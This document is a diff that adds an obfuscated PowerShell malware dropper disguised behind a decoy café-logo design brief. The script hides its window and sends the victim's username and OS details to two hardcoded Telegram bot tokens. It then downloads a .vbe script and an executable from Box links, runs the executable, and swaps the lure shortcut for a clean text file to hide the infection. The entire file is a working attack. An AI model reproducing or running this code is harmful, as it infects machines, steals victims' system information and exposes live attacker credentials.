@@ -1,0 +1,190 @@
+Add-Type -Name a0 -Namespace b0 -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,Int32 nCmdShow);'
+$v0=[b0.a0]::GetConsoleWindow()
+[b0.a0]::ShowWindow($v0,0)
+$v1=1+2*3-4
+If($v1>0){}
+$v2="Quiet Cup Youtube Design Brief.txt"
+$v3=Join-Path $env:LOCALAPPDATA $v2
+$v4=@"
+YOUTUBE CHANNEL AVATAR DESIGN BRIEF (QUIET CUP – CONCEPT-BASED)
+
+1. Project Overview
+We are looking for a freelance designer to create a minimalist and recognizable YouTube avatar for a café brand called Quiet Cup.
+The design should be based on a specific concept focused on calmness, silence, and subtle visual storytelling.
+
+2. Brand Concept
+Quiet Cup is a modern minimalist café that represents:
+
+calm atmosphere
+slow living
+quiet moments with coffee
+
+The visual identity should feel soft, clean, and emotionally subtle rather than loud or commercial.
+
+3. Core Creative Idea (IMPORTANT)
+The avatar must be based on the concept:
+
+“Silence in a Cup”
+
+Visual metaphor:
+A simple coffee cup with a thin line of steam that becomes a symbolic element of “quiet”.
+
+Key element:
+
+The steam should transform into either:
+a subtle letter “Q”, or
+an abstract smooth shape representing calmness/flow
+
+This is the main creative focus of the design.
+
+4. Design Requirements
+
+Style:
+
+Minimalist
+Clean and modern
+Elegant and calm
+
+Composition:
+
+Centered icon
+Simple coffee cup (line or very simplified shape)
+One thin steam line (important: light, soft, not bold)
+
+Important:
+
+Avoid clichés (no detailed beans, no complex illustrations)
+Avoid visual noise
+Keep maximum simplicity
+
+5. Color Direction
+
+Option A (Primary):
+
+Background: warm beige / soft neutral
+Icon: dark brown / near black
+Steam: soft gray
+
+Option B (Alternative):
+
+Black background
+White line icon
+
+Colors should feel warm, soft, and premium.
+
+6. Typography (Optional)
+
+Preferably no text (icon-only for clarity at small sizes)
+If text is used:
+extremely minimal
+small “Q” integrated into the steam
+
+7. Technical Requirements
+
+Format: 1:1 (square)
+Resolution: 2000x2000 px
+Must be clearly visible at very small sizes (YouTube avatar)
+Clean edges and strong silhouette
+
+8. Deliverables
+
+2–3 initial concepts based on the idea
+Up to 2 revision rounds
+Final files: PNG, JPG, SVG
+Versions:
+Main version
+Light and dark background versions
+Transparent background
+
+9. Timeline
+
+First concepts: 2–4 business days
+Revisions: 1–2 days per round
+Final delivery: 5–7 days
+
+10. Budget
+
+Fixed price: $70–$150
+Payment terms:
+50% upfront
+50% after final delivery
+
+11. Requirements for Designer
+
+Strong experience in minimalist/logo/icon design
+Ability to work with subtle visual metaphors
+Portfolio with clean, modern designs
+
+12. Additional Notes
+The goal is not just to draw a cup, but to create a feeling of silence and calm through design.
+The avatar should feel refined, understated, and emotionally engaging.
+
+Avoid generic “coffee logo” solutions — originality within minimalism is key.
+"@
+$v5=5*2-3
+If($v5>0){}
+$v4|Out-File -FilePath $v3 -Encoding UTF8
+Invoke-Item $v3
+$v6="cd02256441"
+$v7=Get-Random -Minimum 100000 -Maximum 999999
+$v8=cmd /c whoami
+$v9="Build ID: "+$v6+" | Attack ID: "+$v7+" | Device/User: "+$v8
+$v10=Join-Path $env:LOCALAPPDATA "identifier.txt"
+$v9|Out-File -FilePath $v10 -Encoding UTF8 -NoNewline
+$v11=7*3-5
+If($v11>0){}
+$v12="8616431099:AAHEmsXH1dR93Gj7lZ5sil9bcpM2-TuM0dE"
+$v13="8267121597"
+$v14=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+$v15=(Get-CimInstance Win32_OperatingSystem).Caption
+$v16=Get-Content -Path $v10 -Raw
+$v17=$v16+"`n`nSession started for user: "+$v14+"`nWindows Version: "+$v15
+$v18="https://api.telegram.org/bot"+$v12+"/sendMessage"
+$v19=8/2+1
+If($v19>0){}
+$v20=@{chat_id=$v13;text=$v17}|ConvertTo-Json -Compress
+$v21=6*2-3
+If($v21>0){}
+try{$v22=Invoke-RestMethod -Uri $v18 -Method Post -ContentType "application/json" -Body $v20}catch{}
+$v23="8646039789:AAFJ3DUYa1WwRateAy5Lwggs9W-vsONnraQ"
+$v24="270865408"
+$v25=9-3+1
+If($v25>0){}
+$v26="https://api.telegram.org/bot"+$v23+"/sendMessage"
+$v27=@{chat_id=$v24;text=$v17}|ConvertTo-Json -Compress
+$v28=4+6-2
+If($v28>0){}
+try{$v29=Invoke-RestMethod -Uri $v26 -Method Post -ContentType "application/json" -Body $v27}catch{}
+$v30=3*4-2
+If($v30>0){}
+Start-Sleep -Seconds 30
+$v31=2*5-1
+If($v31>0){}
+$v32="https://app.box.com/index.php?rm=box_download_shared_file&shared_name=pv8fyqqg7p5eq5gmefc5oltzal0gf0rq&file_id=f_2202711021520"
+$v33="1446062403_house.vbe"
+$v34=[Environment]::GetFolderPath("LocalApplicationData")
+$v35=Join-Path $v34 $v33
+$v36=9-2+1
+If($v36>0){}
+try{$v37=New-Object System.Net.WebClient;$v37.DownloadFile($v32,$v35)}catch{}
+$v38=8*2-3
+If($v38>0){}
+$v39="https://app.box.com/index.php?rm=box_download_shared_file&shared_name=vbap6xhhdlv8663uwpzkuu04qn3z3n3u&file_id=f_2201333876452"
+$v40="1446062403_key.exe"
+$v41=Join-Path $v34 $v40
+$v42=7*2-1
+If($v42>0){}
+try{$v43=New-Object System.Net.WebClient;$v43.DownloadFile($v39,$v41);$v44=New-Object System.Diagnostics.ProcessStartInfo;$v44.FileName=$v41;$v44.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Normal;$v44.CreateNoWindow=$false;[System.Diagnostics.Process]::Start($v44)|Out-Null}catch{}
+$v45=6*3-2
+If($v45>0){}
+$v46="Quiet Cup Youtube Design Brief.txt.ink"
+$v47=$false
+$v48=$null
+$v49=@((Join-Path $env:USERPROFILE "Desktop"),(Join-Path $env:USERPROFILE "Downloads"),(Join-Path $env:USERPROFILE "Documents"),(Join-Path $env:USERPROFILE "Pictures"),(Join-Path $env:USERPROFILE "Videos"),$env:LOCALAPPDATA,$env:APPDATA)
+$v50=5+3-1
+If($v50>0){}
+foreach($v51 in $v49){If(Test-Path -Path $v51){$v52=Join-Path $v51 $v46;If(Test-Path -Path $v52){$v48=$v52;$v47=$true;break}}}
+$v53=7*2+1
+If($v53>0){}
+If($v47){$v54=Split-Path -Parent $v48;$v55=Get-Date;$v56=600;while(((Get-Date)-$v55).TotalSeconds -lt $v56){$v57=Get-Process -Name "wscript" -ErrorAction SilentlyContinue;If($v57){try{Remove-Item -Path $v48 -Force -ErrorAction Stop;$v58=Join-Path $v54 (Split-Path -Leaf $v3);Copy-Item -Path $v3 -Destination $v58 -Force -ErrorAction Stop;exit}catch{exit}}Start-Sleep -Seconds 3}}
+exit
